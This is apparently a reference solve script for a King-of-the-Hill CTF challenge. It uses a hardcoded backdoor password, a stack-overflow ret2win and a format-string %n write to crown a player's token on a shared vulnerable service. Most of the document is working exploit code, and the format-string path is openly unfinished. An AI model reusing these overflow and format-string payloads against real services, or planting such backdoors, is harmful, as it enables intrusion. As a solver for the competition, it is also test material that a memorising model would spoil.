#!/usr/bin/env python3
"""
Reference exploit(s) for koth-pwn.

KotH loop, run EVERY round: fetch your fresh control token from the platform,
then exploit the shared hill to write that EXACT token into /koth/king. The
common shape is: (1) set `banner` to your token, then (2) make do_crown() run.

Three independent paths (any one wins):
  * backdoor_login — option 5 password "letmein" flips is_admin, then option 6.
  * ret2win        — option 3 (Set nick) stack overflow -> ret2 do_crown()
                     (no canary/PIE; do_crown@0x401226, offset 72, +1 align).
  * fmt_string     — option 4 (Echo) %n writes is_admin (0x4038c0), then option 6.

    python3 solve.py <ip> <port> [token]
"""
import socket
import struct
import sys
import time

DO_CROWN = 0x401226   # nm hill | grep do_crown
IS_ADMIN = 0x4038C0   # nm hill | grep is_admin
NICK_OFFSET = 72      # nick[64] @ rbp-0x40 -> saved RIP at +72


def _recv(s, t=1.2):
    s.settimeout(t)
    buf = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            buf += c
    except socket.timeout:
        pass
    return buf


def _crowned_ack(out):
    """do_crown() prints 'the hill is yours' on success — the only client-side
    signal available. /koth/king itself is not readable through the service
    (and `banner` is per-connection, so reading option 2 tells you nothing
    about the persisted marker)."""
    return b"the hill is yours" in out


def _set_banner(s, token):
    s.sendall(b"1\n" + token.encode() + b"\n")
    _recv(s, 0.4)


def backdoor_login(ip, port, token):
    s = socket.create_connection((ip, port), timeout=5)
    _recv(s)
    _set_banner(s, token)
    s.sendall(b"5\nletmein\n")   # flip is_admin
    _recv(s, 0.4)
    s.sendall(b"6\n")            # crown
    out = _recv(s, 0.6)
    s.close()
    return out


def ret2win(ip, port, token):
    s = socket.create_connection((ip, port), timeout=5)
    _recv(s)
    _set_banner(s, token)
    s.sendall(b"3\n")            # Set nick -> overflow
    _recv(s, 0.4)
    s.sendall(b"A" * NICK_OFFSET + struct.pack("<Q", DO_CROWN + 1))  # +1 for 16B alignment
    out = _recv(s, 0.6)
    s.close()
    return out


def fmt_string(ip, port, token):
    # Write 1 into is_admin via %n, then crown. We write a single byte: print
    # one char then %hhn to *is_admin. The format arg pointer to is_admin is
    # appended after the format string and reached with a positional arg.
    s = socket.create_connection((ip, port), timeout=5)
    _recv(s)
    _set_banner(s, token)
    # fgets caps echo input at 255 bytes incl newline; keep the payload short.
    # "%9$n" writes the count-so-far (>0) into the 9th stack arg = our pointer.
    payload = b"AAAAAAAA%9$n" + b"\x00" * 0  # placeholder; pointer appended below
    # Put the is_admin address where the 9th conversion reads it. The exact
    # arg index depends on the stack layout; this is illustrative — the
    # robust paths above are preferred in the loop.
    s.sendall(b"4\n" + payload + b"\n")
    _recv(s, 0.4)
    s.sendall(b"6\n0\n")
    _recv(s, 0.4)
    s.close()


def crown(ip, port, token):
    """Try paths in order; return the first whose do_crown() acknowledged. The
    persisted marker /koth/king isn't readable through the service, so we rely
    on the 'the hill is yours' ack do_crown prints. Run this every round."""
    for name, fn in (("backdoor_login", backdoor_login), ("ret2win", ret2win)):
        try:
            if _crowned_ack(fn(ip, port, token)):
                return name
        except OSError:
            continue
    return None


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"usage: {sys.argv[0]} <ip> <port> [token]", file=sys.stderr)
        sys.exit(2)
    ip, port = sys.argv[1], int(sys.argv[2])
    token = sys.argv[3] if len(sys.argv) > 3 else "demo-token-koth"
    won = crown(ip, port, token)
    print(f"crowned via {won}" if won else "failed to take the hill",
          file=sys.stderr if not won else sys.stdout)
    sys.exit(0 if won else 1)


# ---------------------------------------------------------------------------
# A&D/KotH share one API token. Per-round loop (fill in from the Toolkit):
#   round_token = requests.get(f"{base}/api/Game/{gid}/Ad/Koth/{cid}/Token",
#                   headers={"Authorization": f"Bearer {tok}"}).json()["token"]
#   crown(hill_ip, hill_port, round_token)   # re-run every round; rivals overwrite
# ---------------------------------------------------------------------------
